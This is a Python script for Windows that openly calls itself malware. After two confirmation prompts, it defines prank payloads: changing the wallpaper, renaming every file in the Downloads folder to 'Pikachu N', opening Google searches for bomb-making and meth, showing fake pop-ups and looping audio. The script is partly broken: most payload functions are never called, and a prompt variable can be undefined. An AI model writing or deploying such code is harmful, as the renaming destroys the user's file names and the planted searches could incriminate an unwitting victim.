import subprocess as sub
import win32gui as gui
import win32con as con
import win32api as api
import win32ui as ui
import ctypes
import os
import time
import glob
import random
import webbrowser
from playsound import playsound
import pygame

Running = False

Ask1 = gui.MessageBox(None, "This Malware has the ability to DESTROY your pc.\nDo you want to Run?\n", "WARNING", con.MB_OKCANCEL)
if Ask1 == con.IDOK:
    Ask2 = gui.MessageBox(None, "This is your last warning, are you SURE?", "WARNING", con.MB_OKCANCEL)
if Ask2 == con.IDOK:
    Running = True

def ChangeWallpaper():
    """
    Changes the desktop wallpaper to Assets/Wallpaper.png using the Windows API.
    """
    Wallpaper_Path = "Assets/Wallpaper.png"
    
    # Get the absolute path required by the Windows API
    try:
        # Assumes the script is run from its directory
        script_dir = os.path.dirname(os.path.abspath(__file__))
    except NameError:
        # Fallback for interactive environments
        script_dir = os.getcwd() 
        
    abs_wallpaper_path = os.path.join(script_dir, Wallpaper_Path)

    if not os.path.exists(abs_wallpaper_path):
        print(f"Error: Wallpaper file not found at {abs_wallpaper_path}")
        return False

    # Windows API Constants
    SPI_SETDESKWALLPAPER = 20  # Action ID for setting wallpaper
    SPIF_UPDATEINIFILE   = 0x01 # Write setting to the user profile
    SPIF_SENDWININICHANGE = 0x02 # Notify other windows of the change
    flags = SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE

    # Call the Windows API function
    # user32.dll handles UI/user interaction functions
    result = ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER, 
        0,                    # Parameter not used for this function
        abs_wallpaper_path,   # The full path to the image
        flags                 
    )

def ChangeDownloads():
    """
    Renames every file in the default Windows Downloads folder to 
    'Pikachu 1.ext', 'Pikachu 2.ext', etc., preserving file extensions.
    """
    
    # --- 1. Define the target directory ---
    # This specifically targets the *current user's* Downloads folder on Windows
    downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
    
    if not os.path.isdir(downloads_path):
        print(f"Downloads directory not found at: {downloads_path}")
        return

    print(f"Targeting directory: {downloads_path}")
    
    # --- 2. Get all files in the directory ---
    # We use glob to get all file paths that likely correspond to files
    files = glob.glob(os.path.join(downloads_path, '*.*'))
    
    if not files:
        print("No files found to rename.")
        return

    # Sort files to ensure a consistent naming order
    files.sort(key=os.path.getmtime) 

    # --- 3. Rename loop ---
    i = 1
    for old_path in files:
        # Get the original file extension (e.g., '.jpg', '.pdf', '.exe')
        _, file_extension = os.path.splitext(old_path)
        
        # Create the new filename: "Pikachu {number}{.ext}"
        new_filename = f"Pikachu {i}{file_extension}"
        
        # Create the full new path
        new_path = os.path.join(downloads_path, new_filename)
        
        # Rename the file
        try:
            os.rename(old_path, new_path)
            i += 1
        except OSError as e:
            print(f"Error renaming file {old_path}: {e}")
            break
            
    print(f"\nRenaming complete. {i-1} files were renamed.")

def PikaFile():
    with open("Pikachu.Pikachu", "w") as file:
        for i in range(100):
            file.write("Pikachu\n")

def SearchPika():
    search_terms = [
    "Pikachu wallpaper",
    "Pikachu memes",
    "Pikachu cosplay",
    "Pikachu ASCII art",
    "Pikachu party ideas"
    ]
    term = random.choice(search_terms)
    url = f"https://www.google.com/search?q={term}"
    webbrowser.open(url)

def ConserningSearches():
    search_terms = [
        "How to build a bomb",
        "Whats my ip",
        "How to dox myself",
        "How to make meth",
        "How to buy a bomb"
    ]
    term = random.choice(search_terms)
    url = f"https://www.google.com/search?q={term}"
    webbrowser.open(url)

def FakeNotifs():
    Notifs = [
        "Congratulations, you’ve won… absolutely nothing!",
        "Get off discord you discord mod..",
        "Achievement unlocked: Opening too many tabs!",
        "Reminder: Your keyboard is judging your typing speed.",
        "Notice: This pop-up serves no purpose whatsoever.",
        "Thunderbolt.exe has crashed"
    ]
    Notification = random.choice(Notifs)
    gui.MessageBox(None, Notification, "IMPORTANT", con.IDOK)

def play_bg_sound(file):
    # Initialize the mixer with safe defaults
    pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=512)
    pygame.mixer.music.load(file)
    pygame.mixer.music.play(-1)  # -1 = loop forever

play_bg_sound(r"Assets\\Audio.mp3")

# Keep program alive so you can hear it
while True:
    time.sleep(1)